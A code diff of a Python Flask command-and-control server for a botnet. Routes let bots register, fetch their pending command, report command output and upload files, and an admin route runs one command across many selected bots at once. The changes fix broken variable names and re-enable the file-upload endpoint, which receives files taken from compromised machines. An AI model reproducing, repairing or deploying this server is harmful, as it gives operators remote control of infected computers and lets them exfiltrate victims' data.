@@ -47,9 +47,9 @@ def push_command(botid):
 @Utilities.route('/<botid>/get_current_command', methods=['POST'])
 def get_command(botid):
     bot = Bot.query.get(botid)
-    if not agent:
-        agent = Agent(botid)
-        db.session.add(botid)
+    if not bot:
+        bot = Bot(botid)
+        db.session.add(bot)
         db.session.commit()
     # Report basic info about the bot
     info = request.json
@@ -77,18 +77,18 @@ def get_command(botid):
 @Utilities.route('/<botid>/command_result', methods=['POST'])
 def ouput_command(botid):
     bot = Bot.query.get(botid)
-    if not agent:
+    if not bot:
         abort(404)
     out = request.form['output']
-    agent.output += cgi.escape(out)
+    bot.output += cgi.escape(out)
     db.session.add(bot)
     db.session.commit()
     return ''
 
-"""
+
 @Utilities.route('/<agent_id>/upload', methods=['POST'])
 def upload(agent_id):
-    agent = Agent.query.get(agent_id)
+    agent = Bot.query.get(agent_id)
     if not agent:
         abort(404)
     for file in request.files.values():
@@ -108,7 +108,7 @@ def upload(agent_id):
         db.session.add(agent)
         db.session.commit()
     return ''
-    """
+
 
 @Utilities.route('/massexec', methods=['POST'])
 @require_admin
@@ -119,7 +119,7 @@ def mass_execute():
             Bot.query.get(bot_id).push_command(request.form['cmd'])
         flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
     elif 'delete' in request.form:
-        for agent_id in selection:
+        for bot_id in selection:
             db.session.delete(Bot.query.get(bot_id))
         db.session.commit()
         flash('Deleted %s agents' % len(selection))
